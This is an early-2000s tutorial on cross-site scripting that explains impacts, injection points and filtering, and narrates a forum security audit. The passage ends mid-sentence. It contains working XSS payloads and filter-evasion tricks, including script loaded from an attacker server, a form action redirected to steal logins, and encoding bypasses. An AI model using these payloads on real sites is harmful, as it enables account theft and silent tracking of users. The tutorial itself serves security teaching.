@@ -1,0 +1,1041 @@
+Real World XSS 
+
+Author:     David Zimmer 
+Site:       http://sandsprite.com/Sleuth
+Downloads:  http://sandsprite.com/Sleuth/small_xss_utilities.zip
+
+-----------------------------------------------------------------
+
+Updated 11/04/03 - 
+   		    -Article Downloads included
+   		    -HTML and downloadable CHM versions now available, see
+        		http://sandsprite.com/Sleuth/papers.html for links
+
+-----------------------------------------------------------------
+
+Section 1 - Description, and overview
+   	  	-Introduction
+		-Prerequisites
+		-Impacts (Attack Scenario)
+		-Impact Summary
+
+Section 2 - Methods of Injection, and filtering
+		-Injection Points
+		-Injection methods and filtering
+		-XSS scripting tips and tricks
+
+Section 3 - Inside the mind, mental walk along of a XSS hack
+
+Section 4 - Conclusion
+
+
+##################################################################
+
+Section 1 - Description, and overview
+------------------------------------
+
+INTRODUCTION
+-----------------------
+
+So what is all the media fuss about XSS? 
+
+For those of you who don’t know the acronym, XSS stands for
+Cross-Site Scripting. It is the term that has been given to
+web pages that can be tricked into displaying web surfer supplied
+data capable of altering the page for the viewer.
+
+This is a pretty broad term and I apologize, but as you will see
+XSS has such a wide ranging berth of attack vectors that such a 
+Description is necessary.
+
+We have all seen the numerous Bugtraq postings "XSS FOUND IN
+MANY MAJOR WEB SITES" and we have seen the examples to prove it
+Does indeed exist, but many of these still leave many readers thinking
+"Ok, so they can throw up an alert box, how dangerous can that be?"
+
+This brings us to our first general truth..Finding XSS holes is the
+easy part, knowing how to creatively exploit them and assessing the 
+possible impact of them is where the real coding and creativity comes in.
+
+There are many many documents on the web detailing XSS and generalized
+book definitions of it, what I haven’t seen is a practical approach and
+example usage of outside of the bounds of the few default examples
+usually given. I believe this has made people overlook XSS and not 
+realize its true impact.
+
+For a brief background, I first started my study of XSS about 5 years ago,
+when I (ab)used it playing pranks in 'no rules' html chatrooms. From there
+I branched out using my knowledge and abilities to help secure sites and
+perform web application security audits. I have a personal fascination with
+programming and web technologies and have grown very familiar with windows
+programming, ASP, database and other web technologies.
+
+The knowledge contained in this document is a summation of these years of study
+experience, intuition and experimentation. Many of these concepts are things
+that I have been introduced to by piecing together bits of information and
+conversations over the years. I am presenting them all here together in one
+document because I have yet to find a comprehensive resource detailing the
+exact impacts in conversational real world scenarios.
+
+
+Prerequisites
+---------------------------------------------
+	
+Some topics basic to this document are an understanding of URL structure,
+and some knowledge of html and JavaScript. Additionally knowledge of
+URL encoding, http request methods and web application technologies such 
+as ASP, would be helpful.
+
+
+XSS IMPACTS
+----------------------------------
+
+Before we look at the specifics of how these page alterations are
+possible, lets take a step back and enumerate some of the possible
+impacts XSS can have on your web site. The root question we should 
+ask ourselves is what could an attacker be trying to gain by using
+XSS ? 
+
+1) Theft of Accounts / Services
+
+	Of course the first thing that comes to mind when XSS is mentioned is
+Cookie theft and Account Hijacking. In fact, one of the default XSS examples
+shown to the public is alert(document.cookie) signifying the importance and
+inherent dangers of a third party being able to execute arbitrary web code
+in the clients browser.
+
+	In a fair amount of cases, especially with older web applications,
+a stolen cookie can easily lead to account hijacking. This occurs when the
+cookie is used to hold all of the verification information on the client side
+and nothing is tracked on the server as to the surfers state or credentials.
+
+	Some common motivations for this category would include:
+		Identity theft
+		Accessing confidential resources 
+		Accessing pay content
+		Account Denial of service
+	
+2) User Tracking / Statistics
+	
+	Another usage of XSS is in gaining information on a sites web surfer 
+population. As an experiment some time ago I set up a simple mechanism where
+I could literally monitor people’s clicks through a vulnerable site.
+
+	Yes this is perfectly possible, and indeed was shockingly easy to do,
+Had I taken the experiment a step farther I could have also linked the surfers
+email address to their surfing habits and interests, stats advertisers and spammers
+dream of. 	
+
+3) Browser/ User exploitation
+
+	The second most common example of XSS exploitation provided is the
+venerable alert('XSS Example') script. A simple alert box is a very innate
+example of the type of attacks that fall into the category of user exploitation.
+
+	One visit to George Gunskies Site or a review of some of the browser
+exploits discovered by ThePull should be enough to make anyone realize that 
+surfing the web can be a dangerous experience.
+
+	Imagine if I had, in the above example, not just tracked users, but had
+instead been trying to actively exploit them? I could have used an unknowing
+web site to discrimnate my malware to thousands of unsuspecting victims all at once!
+
+	A couple things that I should also mention that may not be to obvious with
+this style of attack is
+
+	A) to a casual surfer, your site is the hostile site
+	B) I can be leveraging off of the credentials of your site.
+		eg. Say Microsoft.com had a XSS hole that someone exploited like this.
+			If I were to utilize a unsafe activex control in my exploit,
+			surfers would take into account that this was after all 
+			Microsoft, and they very well may click ok to run it, even if
+			they would not on other sites.
+	c) I have a much much higher distribution rate and even a tighter target audience
+		than I would through many other distribution types.
+	d) I don’t actually have to exploit them, I can just steal them all from your
+		site and bring them to mine.
+	e) I might not even care about abusing your site, I might just care about
+		the number of surfers I can hit and force into actions on other
+		third party web sites. 
+
+	The Sub category of User exploitation is a subtle variation but a distinction
+worth making. Browser exploits rely on specific security holes in specific versions of
+web browser software. User exploitation is the act of forcing users to take actions on
+your behalf. These actions can include privileged actions only then can perform like
+account modifications, sending email etc, or they can just be used to force random 
+unsuspecting web users to take general actions and give me an abstraction layer in the
+chain of evidence.
+
+4) Credentialed Misinformation
+
+	One of the most dangerous, yet often overlooked, is the danger of Credentialed 
+Misinformation. Once we have active scripting executing in a browser, we can pretty much
+do anything we could desire with the pages content. If you were a large trusted news site,
+this could be quite a dangerous thing. Imagine seeing a link on a messageboard or email
+saying that there were a reactor meltdown on the west coast and thousands were dead and
+injured? the site was clearly a legitimate large news site and a trusted resource. The url
+looks legit, is only about 50 characters long and raises no suspecisions. When you get to 
+the site, you are horrified to read through the pages of graphic detail. How can this be?
+
+	With a XSS vulnerable site...it could quite possible NOT be. Misinformation attacks
+are not limited to news sites. With but a minor twist and a quick jaunt of thought, My 
+originally email message could have appeared to have come from some popular web site you
+have an account with and asking you to visit this page to renew your password for
+security measures. Again the Url aims directly into the heart of your beloved site, so you
+think little of it and just fill out the information. What you don’t see behind the scenes
+is that the crafted url you clicked on got your browser to display a phony login page
+created by a malicious author and that the form just submitted all your login information
+to him. Congratulations you have been duped with the help of a XSS vulnerable site, and you 
+will probably never know it.
+
+5) Free Information Dissemination
+	
+	With the concept of page rewriting under our belts from the misinformation
+dialogue, the concept of free information dissemination is one of the next logical
+realizations we come to. Lets say I have a message I want to get out like SPAM or 
+some political extremist message. In both of these cases It would be desirable for
+me to limit my personal attachment to the message and further draw out the evidential
+chain leading to me. Again I can utilize a XSS vulnerable site to show my message.
+All I would need to do is to post a crafted url on some messageboard, if the message
+was relatively short I could include it all inline in the URL and not have to worry
+about exposing my own web hosting account and linking it to the message,
+
+6) Other
+
+	This category is included for the simple fact that there are as many types
+of attack possible as there are attackers , motivations and technologies available
+to exploit. A couple scenarios that might fall into this category would be using
+random web user as an abstraction layer..forcing their browsers to silently make
+exploitive requests to other web servers. This blind proxying would again lengthen
+the evidential chain leading back to you. 
+	
+Another technique would be to use a XSS vulnerable sites large user
+base to chew up a smaller sites bandwidth. Just insert a 1x1 image src to the largest
+image on the target site. With a large enough viewing you could effectively chew up
+the targets bandwidth for a while.
+
+	Finally there are techniques that aren’t really scripting attacks but are still
+html injection attacks and are worth mentioning because the filtering is still in our
+ballpark. Html injection attacks are ways to insert malicious html to wack someones 
+web pages. A couple brief examples will be covered down in the filtering section.
+
+
+XSS IMPACT SUMMAARY
+------------------------------
+	Now that you have seen of the possible utilizations of XSS, we shift gears slightly
+and summarize its strengths and weaknesses as an attack vector.
+
+Strength
+
+1) can include a very large and target audience with one injection point. In some
+instances can hit every single user of your web application at once and be present
+on every single page they visit
+
+2) can force a user to any action they are able to take, and can potentially access
+any information they can access
+
+3) can be hard to detect and can be slipped in quietly, chain of evidence can be drawn
+out and not readily apparent how exploit or actions occurred
+
+4) can be a powerful tool for information display and alteration. With the advanced 
+
+features
+of IE and dynamic html, every portion of a pages content can be changed on the fly through
+active scripting.
+
+Weaknesses - 
+	
+	XSS is 95% percent avoidable with proper filtering techniques on any user
+supplied data. While making sure that every element is filtered in large (and especially
+legacy) web applications can be a daunting task, properly implemented filters can prevent
+your site from falling victim to the above mentioned attack scenarios. To date there
+are several commercially available tools that will scan your web application and automate 
+
+the task timely task of XSS enumeration. One such tool is of course WebInspect from 
+
+SpiDynamics.
+
+	What is the 5% that is unavoidable? Reality, we have to accept that web
+applications can be huge tangled beasts to edit and secure, we have to accept that
+even a small last minute modification can have unforeseen impacts, that no one can
+catch everything, that as new technology and browser capabilities emerge filters
+have to be reevaluated, new attack concepts and finally that there is nothing
+called a sure thing  (tm). In the end its always better to know your process
+capabilities and accept the reality of the unforeseeable. 
+
+
+###############################################################################
+Section 2 - Methods of Injection, and filtering
+-----------------------------------------------
+
+INJECTION POINTS -
+----------------------------
+
+	The next logical step in understand XSS is to enumerate its injection points.
+Where can our web applications fall victim? Since XSS works as an interaction with
+active server content, any form of input should be filtered if it is ever to show up
+in a html page. 
+
+	The default example, and the easiest to exploit, is parameters passed in
+through query string arguments that get written directly to page. These are enticingly
+easy because all of the information can be provided directly in a clickable link
+and does not require any other html to perform. 
+
+	Many web authors feel that making their page only respond to POSTed 
+inputs gives them an added layer of security against these types of attacks. While
+this can be true if coupled with other preventive measures, any where i can inject
+a html form and have the user click a submit button, I can get them to post to a 
+form (and yes the form can be hidden and the submission easily automated).
+
+	The above two examples describe active XSS attacks. That is to say ways in
+which a user has to take an action and make a choice to be hit with a XSS attack.
+This gives the user the opportunity to examine the link or to discover us, this is no
+good from the exploiters view. Sure it works, but it is to dependant and relies on
+us not getting caught and having the user care enough to take some action.
+
+	More dangerous are passive XSS attacks. These are
+defined as attacks I can perform where the user will not have to take any action,
+they will not have to click on any link, and they will have no idea that anything
+out of the ordinary is occurring. These attacks occur automatically and can hit very
+very large audiences completely silently.
+
+	If the user has to take no action, how does the malicious data make it to
+them? Database storage. Think of a messageboard, If I were able to post active scripting
+in my post, anyone who viewed my page would automatically be executing whatever I 
+could cook up without even knowing it. Think laterally for a second and you will
+quickly realize that any data store your web app does that eventually makes it back
+for surfer viewing is potentially a target for a malicious user to create a passive 
+XSS attack with.
+
+	This is how I achieved the XSS User tracking mentioned in the above
+example. I was performing a security audit for a large forum site. The site allowed
+users to post articles and discussions and kept a marquee of the top 10 as part of its
+default page template. Every single page on the site had this marquee, and through
+parameter manipulation and its subsequent database storage, I was able to have the
+server output my tracking code to every single surfers that was on the site. 
+
+	I sat back, watched and catalogued all of the sites users as they navigated 
+amongst the pages. Had this not just been a demonstration, I could have literally linked
+usernames and email addresses to those observed surfing habits. Probably not something
+you would desire for your prized user base.
+
+	Sites that are particularly vulnerable to this form of attack would include
+guest books, html chatrooms, messageboards, discussion forms etc. If you have any of
+these on your site pay particular attention to filtering user supplied data. If you
+do find a XSS hole on your site, you must also make sure to scrub your database to
+break any of the existing code that may already be stored away. When you are doing
+the filtering remember to use case insensitive search’s, it is a simple mistake but much to 
+easily overlooked.
+
+	Another note worth throwing in here, is that as business apps with private
+intranets and integrated web applications become more prevalent, Even windows
+developers have to start concerning themselves with the dangers of cross site scripting.
+In a humorous example, the other day at work I was able to enter html code in a business
+app we are developing, which in turn became displayed in the web app interface we
+had integrated with it. This adds a whole new dimension to XSS and even Sql injection
+attacks, but alas I digress.
+
+	One last Injection point to consider is your error pages. Some servers include
+special "404 Page Not Found" or servlet error messages that detail the page that was
+requested, or parameters passed in. If these elements are not filtered they provide a
+perfectly overlooked breeding ground for XSS injection.
+
+
+
+INJECTION METHODS AND FILTERING...
+-----------------------------------------
+
+	Now that we have a handle on the breadth of the problem, and where the 
+malicious input may come from...we have to understand just what data may be thrown
+at us and how to combat it.
+
+	Active XSS is relatively easy to prevent by filtering out a series of 
+characters in any user input received. Since each page has a defined window
+of inputs, they can all be filtered in a quite logical sequential way.
+
+	When we migrate to shielding against passive XSS attacks it is somewhat
+of a different story. Often user information and data is taken in through a series
+of web forms. The final pages, a conglomeration of many users supplied data. Of course,
+again all input data must be filtered, but typically there are many more
+places for err to crop up. This problem is compounded by the desire for many of these
+types of datastorage web applications to allow the user to enter some html inputs.
+
+	Html is a very dynamic and free flowing language. Something that allows the web
+to be as advanced and colorful as it is, and also something that can make it a nightmare
+to parse and filter. To make matters even worse, browser technology and features are
+expanding at an incredible rate. While this makes the web fun and dynamic, it makes
+the security auditors job more difficult. How can you expect a legacy web application
+to take into account new features, protocols and attack vectors? You cant.
+	
+	The easiest way to deny cross site scripting (and probably the only really
+secure way) is to deny users the ability to use any form of html in their data. If you
+would like to allow html, just realize that your filtering routines must be designed
+very wisely. Many many very large high profile sites have had XSS holes discovered in
+them as the result of filter loop holes, including Yahoo and Hotmail.
+
+	The next logical step is to see some examples of just how XSS can get
+inserted into a page. I have created a simplistic asp page that will walk you through
+some common injection points and example exploitation of it. Please take a few minutes
+to read through it and play with the examples. To see how it all works right click
+and view source and identify where the injection occurred.
+
+[ insert url of demo page here ]
+
+
+
+FILTERING
+----------------------------------------------
+
+Filtering can be both a relatively simple matter, and a vastly complex one all 
+at the same time. The incongruece lies in the extent of your needs. Your server
+side scripting language of choice can also help you minimize your exposure. 
+Before we get into active server languages just let me admit I am most familiar
+with asp so that is where the heft of my examples shall rest.
+
+Lets assume you have a parameter coming in that you expect to be an integer. That 
+assumption can often be your downfall, which incidentally is also why these types of
+parameters are often found to be sql injection points as well. Anyway.. integer types
+are easy to filter. Actually we can let the ASP engine cleanse these for us in
+one step. Consider the asp line:
+
+x=cInt(Request.QueryString("num"))
+
+What happens if our friend num is not an integer? ASP engine throws an error
+
+Microsoft VBScript runtime  error '800a000d'
+Type mismatch: 'cint'
+
+Well that handles that. In perl I believe simply adding +0 to the variable will
+have a similar effect and force the variable to be numeric.
+
+But what about string types? That is where the brunt of the work is going to lie
+and where all of the problems begin. If we do not want to allow any html input
+what so ever then our job is simple. Remove all < signs and quotes and we should
+be pretty safe as long as any html we insert into dynamically is always wrapped
+in a quoted string. Note that if we had a page source something like:
+
+<img src=/images/img<%Response.Write(Request.QueryString('nextimg'))%>>
+
+In this example removing quotes and < will make it very hard for an attacker to
+create a usable attack but I would not venture to say it impossible.
+Since the src= attribute is not quoted in anyway, there is nothing for
+them to have to break out of. If the next img value merely contains a space in it
+they will effectively be out of the src= attribute and able to insert their own code
+such as onerror=. Even though technically they will be able to execute code with this 
+
+technique, scripting without the use of quotes is extremely hard (or at least I haven’t 
+discovered the trick to it yet) see the tips and tricks section for some techniques I am
+playing with to try to work around it.
+
+The last category and the most in-depth to cover is the technique and considerations
+of allowing only some html content and trying to deny the use of malicious html and
+scripting. 
+
+Users who would use these techniques include web mail providers, message boards and
+html chatrooms. Before we go into script filtering we should expand on the 
+definition of malicious html some. If an attackers goal is only to wack your site
+he might be just as content to make your new message board unusable to others as he
+is to use it to exploit all your surfers. This could easily be done through pure html
+tags with no attributes. It is doubtful that you would want your users to have the 
+ability to enter a <plaintext> tag that would turn the rest of your html page and forms
+into an unusable blob of text. It is also unlikely that you would want them to embed
+a 10000000 x 10000000 image of two elephants mating. When it comes to allowing users
+to post html, just beware that you are in it for the long haul. Both in maintaining 
+your filters to current technological demands as well as accommodating for non script
+based attacks. 
+
+Enough digression. Onto the filters. A good disclaimer to enter here is that I am not
+that experienced in creating keyword filters. When it comes to my projects I filter
+exclusively no html. I do however have alot of experience working around filters and
+have read alot of discussions so with that in mind here we go.
+
+The only sane implementation I have heard of is allowing a very confined list
+of html you want to allow and denying all other tags. This could be implemented by
+splitting the textblob at all < signs and then reading up to the first space in
+each element to see what the tag type was. If the tag was recognizable and allowed
+then grab the offset of the closing tag and replace the substring with a clean no
+attribute version of it. If the tag was not allowed then it would be removed. If
+the tag was not allowed and did not contain a closing > then I would ummm I don’t know
+I would have to define the filter and experiment alot :)
+
+For tags where you absolutely had to allow attributes such as img src= tags, I would grab
+the necessary src= attribute, validate it, and then insert it into my own clean
+img src= tag so I didn’t have to worry about any event handlers or lowsrc or dynsrc or
+the like. The same technique would be applied to href= attributes. A safe list of
+tags to allow along these guide lines would be:
+
+<font face= size=></font>
+<b></b>, <I></i>, <u></u>
+<img src=>
+<a href=></a>
+
+Etc.etc. Really this is probably all I would allow by default. IF you need more follow
+the above guidelines on implementation. 
+
+So assuming you follow the above guidelines and allow no tags and no attributes other
+than those you copy over to the saved data what will you have to validate to make
+sure your users are safe?
+
+If the above list is all you allow, I will assume you can manage validating the
+font size= and face= parameters. Img src and href= are two big ones worthy of
+many debates and many dangers that I will attempt to present next.
+
+Lets first look at our img src tag. We have cleansed it from all the tricks of 
+lowsrc dynsrc, event handlers and style elements simply by parsing out the src=
+element. Now we must validate it.
+
+I am walking through thoughts here as we go, so please forgive any jumps.
+
+1)We have to quote the src= string to be safe and accommodate for urls with spaces.
+2)We should remove all single & double quotes in it. 
+3)I would reject any urls with ? querystring identifiers in it and make sure
+    that it did not have .cgi, .pl .php .asp etc in the querystring. Sure we could
+    make a .jpg a perl script but we cant account for every loop hole and this is 
+    already an overcautious measure against webbugs.
+4)Next I would check the protocol. I would deny anything that wasn’t explicitly http://
+
+So what do these filters prevent against?
+
+Quoting the string makes sure they cannot escape the element attribute and insert 
+their own event handlers. This must be don’t in conjunction with step 2 replacing
+all quotes. Actually you probably don’t have to replace both, just the ones you use
+to quote the string with your src= element.
+
+Denying all urls (for img src any) that had ? or reference to a server script would
+deny users the ability to webbug your surfers. A danger of this could be collecting
+stats on users and site and tracking users across pages by their referrer.
+
+!!Note that any link aiming off server will reveal http referrer headers. This is a
+major reason why web developers are told not to include important info in query strings
+and how I used to collect admin logins to chat servers :P (It may also be a good idea 
+to add target=_blank to all links to avoid a possible referrer leak,[but there will always 
+
+be a referrer leak for img src tags])
+
+Next we validate the protocol. For obvious reasons we probably don’t want to allow
+the file:// protocol on links or images. For equally obvious reasons vbscript:
+and javascript: would be an unpleasant experience. In the end it will be best to 
+not worry about what is there, and only worry about what isn’t. No http:// at the
+beginning of the string, then deny the tag. The reason is it is relatively easy to
+add protocol handlers to windows. Aim:// has its own that may have been found vulnerable
+as well as icq:// if these protocols are present in an img tag that may be enough
+to make the browser fire the registered program type.
+
+As a humorous example, back in the days of IE5 I used to embed
+an img src=telnet://myip:23 and then run a custom daemon. All of a sudden my friends
+would complain that some window had popped up and that someone was typing text to
+their screen! Heh parlor tricks gotta love em. On a more serious note, you can see
+the possible danger.
+
+One other thing I just thought of is the possible danger of line break tricks.
+If you follow the above explicitly you should be ok, but if you were to vary at all
+you should be aware that there is a whole subsection of filter bypassing techniques
+based on inserting CR, LF or CRLF into input strings. I have also seen javascript
+execute with a 	 ->  breaking it up. Consider how these may impact your filters
+
+That should give you the basis for a sane implementation of a minimal content keyword
+filter. If you try to base your filters off of just replacing keywords you are going
+to run into all kinds of complexities like new elements, attributes you didn’t know about,
+weird event handlers, script encoding, and even multiline tags that can throw your
+parsing for a loop. If you want to try any of those techniques may the force be with 
+you luke *breathes like darth vader*
+
+
+
+XSS SCRIPTING TIPS AND TRICKS
+---------------------------------
+
+Well I couldn’t resist this section, this is where I have my most fun anyway.
+This is some of the techniques people can hit you with with XSS
+
+Q) Just how much script can you inject in an image src tag?
+
+A) Its a different style of coding but it can get quite complex :)
+
+----------------------
+<img src="javascript:txt='UghhOghh.!!! My Screen Just Ran Away!!!';
+txt2='Now come on you have to admit that was funny *S*';x=0;y=80;
+function niceguy(){nice=confirm(txt2);
+if(nice==1){window.setTimeout('parent.window.moveTo(0,0)',2100)};}
+function ha(x){parent.window.moveTo(x,y);if(x==1800)alert('Hehehe...me went Bye-bye ; )');
+window.setTimeout('if(x!=1800){ha(x+=30);};else{niceguy()}',25)};
+alert('*Yawn*..me tired');ha();">
+----------------------
+
+Q) What are the biggest tricks useful in XSS javascripting?
+	1) knowing how to embed nested quotes is a necessity you can escape
+		quotes in a quoted string like this \' or \" or you can use
+		the unicode equilivents \u0022 and \u0027
+		ex: alert("\u0022") or alert("\"")
+
+	2) keyword filters that allow any js to execute are useless
+		ex: a='navi';b='gator.userAgent';alert(eval(a+b)) 
+
+	3) short input length + script block embed = unlimited script power if
+		you can squeeze in an script src=
+
+	
+	4) ssl pages warn if script src= comes from untrusted site, but if you 
+		can upload anything to the server like image or article that is
+		actually .js file commands, you can bypass this warning because
+		script src=file.jpg (also useful to help bypass input length reqs
+		(also note IE doesn’t care a wink about file extensions on script src=
+		files :) 
+
+	5) you can read an entire pages content with javascript in IE, not just
+		limited to manipulating form elements. You can also edit the page
+		on the fly. learn your dhtml object model danielson !
+
+	6) event stealing: say a page with a log in form has a XSS hole,
+		document.forms[0].onsubmit=myfunction
+		document.forms[0].btnNew.onclick=myfunction
+		document.forms[0].action="http://myserver/myscript.asp"
+
+	7) styles trickery. I have to learn these tricks too! but from what I have
+		heard hinted at and mentioned in passing there are some cool power
+		tricks to be had!
+
+	8) be familiar with methods of script encoding.
+		<img src='vbscript:do%63ument.lo%63ation="http://www.yahoo.com"'>
+		<IMG SRC="javascript:alert('test');">
+		<IMG SRC="javasc	ript:alert('test');"> <-- line break trick
+                \09 \10 \11 \12 \13 as delimiters all work.
+
+	9) working with no quotes (also necessary dealing with injection on php scripts)
+		with php scripts any " or ' we inject is automatically turned into
+		\" and \' respectively :( this is a big problem for complex scripts.
+
+		It kinda works ok for event handler insertion we can still close the
+		parent quotes because html doesn’t understand the \" escape sequence
+		and only sees the " this would let us use simple things where we could
+		get away with only using strings already found in the document, numbers
+		variables, etc but what if we need to include our own string?
+
+		chew on this:
+		regexp = /this is my string its actually a reg expression/
+		alert(regexp.source)
+
+		I haven’t really decided how useful an evasion this is yet. I myself
+		am still chewing away like overcooked steak. With this we can get away
+		with no quotes, however / which we need for urls are special chars and
+		need to be escaped in the reg exp. and php takes \ (which is the reg
+		exp escape char as an escape char and escapes it to \\ so that is
+		confusing. however we also have the power of regexps in our toolbox 
+		and we have a host of built in objects to generate and  build up strings
+		from so something like:
+
+		n=/http:  myserver myfolder evilscript.js/
+		forslash=location.href.charAt(6)
+		space=n.source.charAt(5) 
+		alert(n.source.split(space).join(forslash))
+		//document.scripts[0].src = n.source.split(space).join(forslash)
+
+a little tricky but doable that chewed well after all *yummie*
+
+another trick that could be useful with the no quotes hack is a simple
+		script encoder such as the below example
+
+		pcent=/%/.source
+		str=/20616c657274282774686973206973207265616c6c7920636f6f6c212729/.source
+		temp=str.substring(0,0)
+		for(i=0;i<str.length;i+=2){temp+=pcent+str.substring(i,i+2)}
+		eval(unescape(temp))
+
+		Voila, complex embeddable scripts with no quotes or forward slashes.
+
+##################################################################
+
+Section 3 - Inside the mind, mental walk along of a XSS hack
+-----------------------------------------------
+
+In this section I am going to document some of actual scenarios I have found in
+the wild and what could be done with them. In essence these are some of the experiences
+that made this paper possible. All of the holes I am going to document here were in 
+a large forum / community type sight that shall remain anonymous. All of these tests
+were done legitimately with the blessing of the sites owner and were matters of testing
+as I conducted a security audit on his site. Every tester knows how monotonous churning
+through page source and repetitive tests can be, so I took it upon myself to play and
+experiment and see what I couldn’t squeeze out of some of these seemingly innocuous holes
+and tried to gauge the real impact of these forms of attack.
+
+Before we get started with the details I will describe the web sight a little more. The
+site in question was a large forum type site. Users could login, browse other users 
+
+articles
+and submissions as well as leave messages to each other on numerous messageboards. Each user
+also had an account modification section where they could update their stats as well as
+manage their submissions to the site. 
+
+The main site consisted of a template with search engine functionality as well as a ticker
+of the most recent articles submitted by users. This is a relatively large
+site with anywhere from 3-10 thousand users online at any given time.
+
+As the audit progressed I soon found that by going to the user management interface I could
+embed img src scripts and other html in the author name field. Reflecting back on the 
+layout of the site I knew that this would allow me to execute scripts on anyone who visited
+one of my submissions. I also knew that this would execute anytime my name turned up as a
+result from the site search functionality. 
+
+Now the gears start churning, hummm what can I do with this? Since I am the curious
+type (and mabey a touch mischievous) I decided it would be a worthy cause to play with
+the hole and try to gauge the actual impact. The first thing I wanted to determine is
+how popular of a cat I am ;) (Or in more professional terms, how often my pages were
+being viewed and the scope of the injection vector)
+
+Since I could insert img tags this much could have easily been done just by inserting
+an img src=http://myip and then watching server logs, but since this is a cross sight 
+scripting paper, and that is to boring, I decided to play with some other techniques.
+
+Just for fun I though it would be cool to try to get use the img tag to try to inject
+a full script into the page. Of course this can be done inline with creative javascript,
+lots of semicolons and specially designed strings and functions as in the above example,
+but that is alot of work. Wouldn’t it be nicer to just be able to inject a whole script
+file and not have to worry about complex messy embedded commands? Of course it would.
+
+So how do we get a hapless image tag to do this, and moreover how do we do it so that
+unsuspecting web surfers don’t notice a thing. Having the site we are auditing all 
+of a sudden get wacked by a bunch of kids who notice the hole because we were playing
+with it would just be not good. So we will just have to be a little sly and a little 
+careful.
+
+If we inject a image to a non existent url, it will fire the onerror javascript event 
+handler, but it will also leave that ugly little broken image placeholder in the document.
+ Sure those raise little suspicion and are common place, but I still see it as evidence.
+ So with this in mind we will img src a 1x1 pixel transparent gif image that will load 
+seamlessly and be undetectable to browsers. Loading a successful image raises the onload 
+event handler, here is where we can put our payload with a url such as this.
+
+img src='http://valid address/clear.gif' 
+    onload='document.scripts(0).src="http://myserver/evilscript.js"'
+
+Examining the above code you will see that instead of trying to embed some long
+complex nested javascript inline I chose just to set the script src of the first
+script on the web page to be my script. This makes the browser (IE6 anyway others
+untested) load my script and execute it. My EVIL script in this case was just a 
+one liner, a simple
+
+document.write('some innocous text')
+
+In this way I get to play a little, I get to see who loads a page with my name on it
+and I coat it over so that they never know the difference. The text contained in the 
+document.write code appears right inline in the page next to where ever the img src
+code executed. 
+
+I set up my smallserver to dish out the script file (a small web server package I made
+especially for playing with xss holes that logs directly to screen and is included
+in the support file zip.)
+
+With the above in motion I went back to the site, logged in and changed my name to 
+include the injection script, from the sight  stats atop the page it appears that there
+were some 3000 potential victims.. err test subjects.. afoot. 
+
+I submit the data and then quickly hop to one of my articles to make sure all is 
+working as planned. Sure enough up pops a request on my servers screen and there
+is my innocuous inline text. So far so good, now the waiting game has begun as I 
+anxiously and nervously await the results.
+
+Wait, wait, wait, hit !
+
+This is just like fishing :)
+
+Slowly request after request rolls in, I casually  wade through the data I am collecting
+with a giggle noting the browser people are using, where about in the world they are
+from, and what search topics they had requested that had turned up my name. After about
+5 minutes of data trolling I decided I had indulged my curiosity enough and was ready to 
+move on. 5min collection yielded 20 hits, which doesn’t sound like a lot given that there
+are 3k plus people online, but it should also be noted that I only had 8 articles on
+the site out of hundreds of thousands. Had I been a little more daring I probably 
+should have expanded the test a little to do some simple script tests to see what
+percentage of the user base I hit had been actually logged into the sight at the time.
+But that is borderline unethical so.
+
+With that experience under my belt I got to thinking, given enough time and less morals
+I could have collected all kinds of stats on users, stolen account info, email addresses
+etc. (yes full login information and email addresses were held in the cookies of logged 
+in users on this site)
+
+Since morals being what they are, I instead shifted my attention to a bigger hack. I wasn’t
+satisfied that I could slowly trickle in info..I wanted INFO and I knew that it was out
+there 3k users online...humm how can I impact them all? 
+
+In the days to follow further examination of the sight revealed that in one of the asp
+interfaces I could inject scripts into the article name pane but it had to be done in 
+45 characters or less.
+
+Again examining the layout of the sight to gauge the impact I found that as in the above
+example it would hit users who returned me as a result of a search. However this time if
+it was a new article submission that still appeared in the ticker my code would be output
+to every single user on the site at once and be on every single page they visited!
+
+My heart thumped as my head swam in ideas of the things I could do. I could track users
+across pages, I could correlate email addresses to viewing preferences and topic searches.
+I could literally build a profile of the surfer and even do it in a personal way.
+
+What marketing firm wouldn’t love those kinds of stats? A more malicious individual could
+also take other routes such as account theft, redirect surfers to other sights etc..
+but since we have already covered the dangers and why you should be wary of XSS we wont
+dive into that again.
+
+Ok, so if I can inject a script in 45 chars or less, thousands of users info will be
+at my fingertips. hummm. 
+
+<script src='http://geocities.com/dzzie/x.js'></script> = 55 characters
+
+junk
+
+Nosing around the sight some more, I remembered that it had upload functionality for
+both user documents, zips, and author images. User documents were always inserted 
+into the sites template so weren’t usable for this. the Zip files were scanned and 
+opened to make sure they didn’t contain any virii. This left us with an author image
+upload. Luckily after upload the 'picture' was just given a server defined name 
+and stored to disk without being validated or resized as an image. Perfect :)
+
+So I create my evilscript file and rename it somthing.jpg. I goto my user manager
+and upload it as my author info for my bios. Then I goto my bios page and snag the
+url and name the server gave my file
+
+/images/778237.jpg
+
+Just to double check it was still valid I fired up WebSleuth and made a raw http 
+request for the resource. Sure enough it spit out my script file and no extra data.
+
+going to craft my injection string I try on the fit of my new url
+
+<script src="images/778237.jpg"></script> = 41 characters
+
+Cool, I can just sneak in the script with room to spare.
+
+Just to be thorough I go back and edit one of my old submissions with a simple safe
+script. Sure enough IE loads the script without a complaint of the extension and we 
+are in business.
+
+Soda in hand, interface pages bookmarked I set out for some more stat taking. I knew 
+the test was going to work, and I knew the impact, but somehow that little kid in you
+just has to pop out and have his moment of fun, just to say you did it.
+
+I submit a new article, I hop to my bookmarked page to edit the article (where the 
+validation hole was), paste in my injection string and submit.
+
+Now since the script resided on the server, I could not watch user stats roll in
+from requests of the script file itself. How then did I collect stats on the users on
+the sight? 
+
+Here is another thing worth understanding about cross sight scripting. Data collection
+methods. How did I not detail this above. Anyway, my script is executing on all of these
+random users machines from locations across the globe. How do I receive the data the
+scripts collect?
+
+There are alot of ways to collect the data, you can collect it by watching server logs 
+as we did in the first example.or you can also collect data by forcing the users to submit
+data to CGI scripts which neatly break down and process the data. The problem with 
+both of these techniques though is that it requires some level of commitment on 
+the attackers part to either reveal his own IP or to reveal one of his web hosting
+accounts.
+
+Of course there are many anonymous ways as well. Submitting data to a rouge CGI mailer
+script, forcing the user to post to an anonymous messageboard or guestbook script,
+or even using an unsuspecting trojaned user as a data collector. In the end tracking
+these types of attacks can be very very tricky if not impossible if done right, but we 
+aren’t going to get into all those possibilities now. For our application we are simply
+interested in what browser the users are using and what page they are on. Luckily both
+bits of information are standard browser information leaks given out with any request
+for a web resource. To keep the test as simple and non-damaging as possible I choose
+to just use a small javascript that would change the img src of one the documents 
